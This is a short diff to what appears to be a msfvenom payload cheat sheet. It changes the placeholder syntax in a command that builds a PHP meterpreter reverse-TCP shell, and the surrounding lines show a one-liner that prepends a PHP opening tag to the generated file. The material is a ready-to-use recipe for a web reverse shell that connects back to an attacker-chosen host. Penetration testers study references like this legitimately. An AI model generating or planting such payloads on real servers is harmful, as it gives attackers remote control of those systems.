@@ -54,7 +54,7 @@ One can also use the -a to specify the architecture or the --platform
 **Web Based Payloads**
 ---
 **PHP Reverse Shell**
-<pre>msfvenom -p php/meterpreter_reverse_tcp LHOST=<IP> LPORT=<PORT> -f raw > shell.php </pre>
+<pre>msfvenom -p php/meterpreter_reverse_tcp LHOST=(IP) LPORT=(PORT) -f raw > shell.php </pre>
 <pre>cat shell.php | pbcopy && echo '<?php ' | tr -d '\n' > shell.php && pbpaste >> shell.php </pre>
 
 **ASP/x Reverse Shell**
